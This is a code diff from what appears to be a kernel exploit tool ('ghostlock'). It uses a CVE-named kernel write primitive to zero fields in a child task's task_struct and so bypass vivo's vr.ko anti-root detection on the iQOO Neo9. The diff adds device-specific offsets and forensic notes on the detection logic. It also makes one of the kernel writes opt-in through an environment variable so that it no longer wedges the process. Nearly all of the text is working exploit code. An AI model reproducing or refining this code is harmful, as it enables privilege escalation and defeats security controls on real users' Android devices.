@@ -146,6 +146,15 @@ namespace ghostlock::session::backend {
             pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
             /* ------------------------------------------------------------------
          * vivo vr.ko anti-root per-task bypass (ported from root.c)
+         *
+         * Device scoping: this section targets PD2338 (vivo iQOO Neo9,
+         * OriginOS 16.2.13.2, kernel 5.15.197-g708015331567-dirty). On that
+         * build vr.ko's detect() lives at .text+0x2ecc and gates on
+         * cred->euid==0 plus the "u:r:vrp:s0" SELinux-context comparison —
+         * it never reads thread_info.flags, so tag A is a harmless no-op
+         * against it (kept for 6.x kernels whose detection does read the
+         * flags word). For other devices (6.1/6.6 GKI), re-run the vr.ko
+         * forensics before trusting these offsets.
          * ------------------------------------------------------------------
          * Always compiled: the /proc/modules probe below decides at runtime
          * whether the writes run. The tag-B offset is overridable at build time
@@ -195,17 +204,48 @@ namespace ghostlock::session::backend {
 
                 int32_t vr_ok = 1;
                 if (vr_needed) {
-                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit).
+                     * Kept unconditional: on arm64 5.15/6.1 thread_info.flags is at
+                     * task+0x00 so the write is layout-safe everywhere; on the 5.15
+                     * vendor build it is a no-op for detection (2026-10-05 forensics:
+                     * vr-197.ko's detect reads cred->euid/cred->security, never
+                     * thread_info.flags, and has no fork/exit tag probes at all) but
+                     * harmless, while 6.x builds rely on it. */
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
                     vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
 
-                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders.
+                     *
+                     * ⚠ vivo 5.15 arm64 hazard (2026-10-05 live forensics): the
+                     * 6.1-era VR_TAG_B_OFF=0x2c leaf fire lands its NULL write on
+                     * task_struct.__state (+0x28 in 5.15.197 arm64 per on-device
+                     * BTF) — zeroing it while the victim sleeps in the command
+                     * pipe leaves a zombie-RUNNING task that try_to_wake_up()
+                     * refuses to wake (state==0 short-circuits), wedging
+                     * verify_w2_stage's pipe read until the app-level timeout
+                     * kills the whole run. That zombie was reproduced on
+                     * PD2338 (iQOO Neo9, kernel 5.15.197); the real tag-B
+                     * offset on this kernel was never recovered from vr.ko,
+                     * so tagB now requires an explicit opt-in; 6.1-style
+                     * layouts pass GHOSTLOCK_VR_TAG_B=0x2c to restore the
+                     * original behavior. */
                     if (vr_ok) {
-                        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
-                        const memory::WriteRequest tagb_request =
-                                memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
-                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
+                        long tagb_override = -1;
+                        const char *env_tagb = getenv("GHOSTLOCK_VR_TAG_B");
+                        if (env_tagb && env_tagb[0]) {
+                            tagb_override = strtol(env_tagb, nullptr, 0);
+                        }
+                        if (tagb_override < 0) {
+                            pr_info("VR: tagB skipped (set GHOSTLOCK_VR_TAG_B=<off> "
+                                    "only on kernels where the offset is verified)\n");
+                        } else {
+                            uintptr_t tagb_align =
+                                    (child_task + static_cast<uintptr_t>(tagb_override)) & ~7ULL;
+                            const memory::WriteRequest tagb_request =
+                                    memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
+                            vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
+                        }
                     }
 
                     if (vr_ok) {
